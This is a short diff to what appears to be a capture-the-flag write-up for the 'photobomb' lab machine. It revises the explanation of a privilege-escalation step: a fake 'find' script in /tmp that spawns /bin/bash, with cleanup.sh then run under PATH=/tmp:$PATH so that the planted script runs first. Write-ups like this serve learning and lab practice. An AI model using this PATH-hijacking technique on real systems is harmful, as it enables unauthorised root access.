@@ -129,7 +129,7 @@ So i wrote a simple bash script to spawn a bash shell and names it find in /tmp
 /bin/bash
 ```
 
-I then made my `find` executable and ran cleanup.sh with PATH set to /tmp. 
+I then made my `find` executable and ran cleanup.sh with PATH set to /tmp:$PATH so that the first `find` executable cleanup.sh would find would be my bash script. 
 ```
 wizard@photobomb:/tmp$ chmod +x find
 chmod +x find
